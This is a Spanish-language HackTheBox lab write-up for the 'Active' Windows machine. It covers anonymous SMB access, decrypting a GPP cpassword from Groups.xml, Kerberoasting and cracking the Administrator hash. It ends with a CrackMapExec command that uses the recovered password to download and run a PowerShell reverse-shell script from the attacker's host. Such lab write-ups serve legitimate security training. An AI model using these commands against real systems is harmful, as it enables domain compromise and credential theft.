---
title:  "Active Writeup [ES] - HackTheBox"
date:   2022-01-19 22:00:00 -0300
categories: [HTB]
toc: true
comments: false
tags: [easy, windows, active-directory, kerberoasting]
image:
  src: /images/HTB/Active/00-banner.png
  width: 620   
  height: 410   
---

[Active](https://app.hackthebox.com/machines/148) es una máquina **Windows** de dificultad fácil ofrecida por la plataforma de [Hack The Box](https://app.hackthebox.com/). A lo largo de este post encontrarás un paso a paso de su resolución.

# Resumen

Esta máquina trata conceptos de enumeración de Active Directory, recursos compartidos y autenticación. Primero nos encontraremos con un directorio que podemos acceder a través de SMB utilizando un ***null session***, posteriormente obtendremos credenciales desde un archivo encontrado en este directorio y utilizaremos esas credenciales para realizar un **Kerberoasting** y obtener el hash del usuario Administrator.

![Info](/images/HTB/Active/01-info.png)

# Enumeración

## Rustscan - NMAP

Como siempre, se iniciará realizando un escaneo general de los 65535 puertos. En este caso se utilizará [Rustscan](https://github.com/RustScan/RustScan), proporcionando comandos de nmap para realizar el escaneo desde un one-liner.

* ```rustscan 10.10.10.100 -- -sC -sV | tee ports-rustcan```

```plaintext
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.10.100:53
Open 10.10.10.100:88
Open 10.10.10.100:135
Open 10.10.10.100:139
Open 10.10.10.100:389
Open 10.10.10.100:593
Open 10.10.10.100:3268
Open 10.10.10.100:3269
Open 10.10.10.100:5722
Open 10.10.10.100:9389
Open 10.10.10.100:47001
Open 10.10.10.100:49152
Open 10.10.10.100:49153
Open 10.10.10.100:49154
Open 10.10.10.100:49155
Open 10.10.10.100:49157
Open 10.10.10.100:49158
Open 10.10.10.100:49165
Open 10.10.10.100:49170
Open 10.10.10.100:49171

(...)

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2022-01-20 01:42:44Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5722/tcp  open  msrpc         syn-ack Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49152/tcp open  msrpc         syn-ack Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack Microsoft Windows RPC
49170/tcp open  msrpc         syn-ack Microsoft Windows RPC
49171/tcp open  msrpc         syn-ack Microsoft Windows RPC
```
## Enumeración SMB

Comenzando con [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), haremos una enumeración básica.

![](/images/HTB/Active/10-cme-01.png)

Se obtiene el dominio: ```active.htb``` y el nombre de la máquina: ```DC```.

![](/images/HTB/Active/12-cme-02.png)

Utilizando un usuario y contraseña ```null``` es posible listar directorios compartidos SMB. En donde se obtienen permisos de lectura para el share **Replication**.

Ingresaremos al recurso compartido haciendo uso de ```smbclient``` y descargaremos el contenido de manera recursiva.

```bash
> smbclient //10.10.10.100/Replication -N

Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

                5217023 blocks of size 4096. 279252 blocks available
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```
# Obteniendo credenciales

Dentro de la carpeta ```active.htb``` se puede visualizar lo siguiente.

![](/images/HTB/Active/20-downloaded-share.png)

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
Haciendo una búsqueda rápida en la web, vemos que el archivo ```Groups.xml``` sin duda es interesante ya que éste puede almacenar credenciales relacionadas a políticas de grupo o GPO.

En el archivo se obtiene el usuario ```SVC_TGS``` y vemos un elemento llamado ```cpassword``` que contiene una cadena de caracteres que pueden ser descifrados con la ayuda de [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt).

![](/images/HTB/Active/25-gpp-decrypt.png)

Teniendo estas credenciales, procedemos a chequearlas con ```cme```.

![](/images/HTB/Active/30-cme-user.png)

Posteriormente verificaremos si existen más usuarios por enumerar haciendo un bruteforcing de RID.

![](/images/HTB/Active/35-cme-rid.png)

No se obtienen nuevos usuarios de interés.

# Kerberoasting

Ahora que tenemos un usuario con credenciales válidas realizaremos un ataque **Kerberoasting**.

* ```GetUserSPNs.py active.htb/SVC_TGS -request -dc-ip 10.10.10.100```

![](/images/HTB/Active/40-kerberoasting.png)

Guardaremos el hash en el archivo ```hash``` y lo crackearemos con ```john``` utilizando el diccionario ```rockyou.txt```

![](/images/HTB/Active/45-hash-cracking.png)

Verificaremos la contraseña con ```cme```.

![](/images/HTB/Active/50-cme-admin.png)

# Consola como Administrador

En este punto que ya poseemos credenciales válidas del usuario ```Administrator```, solo bastaría utilizar ```psexec``` para loguear al sistema, pero en este caso quiero una consola a través de PowerShell.

Para obtener una consola interactiva de Powershell, usaremos el parámetro ```-x``` de **CrackMapExec** para ejecutar comandos y obtener una conexión inversa. El proceso a realizar es el siguiente.

1. Descargar el script [Invoke-PowerShellTcp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) y modificarlo para entablar una conexión hacia la dirección IP de nuestra máquina a través del puerto 8443.
2. Compartir el script con un servidor web en python3
3. Iniciar un **listener** para obtener la reverse shell.
4. Ejecutar el siguiente comando de cme con las credenciales de **Administrador**.

```bash
cme smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968' -x "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6:8000/IPS.ps1')"
```

![](/images/HTB/Active/60-Powershell.png)

Ya teniendo nuestra shell, podemos ejecutar una simple búsqueda para listar las flags.

```powershell
Get-ChildItem -Path C:\Users -Recurse -Include user.txt, root.txt | select FullName
```

![](/images/HTB/Active/65-flags.png)

Y eso sería todo para [Active](https://app.hackthebox.com/machines/148). ¡FELIZ HACKING!


![](/images/HTB/Active/100-pwned.png)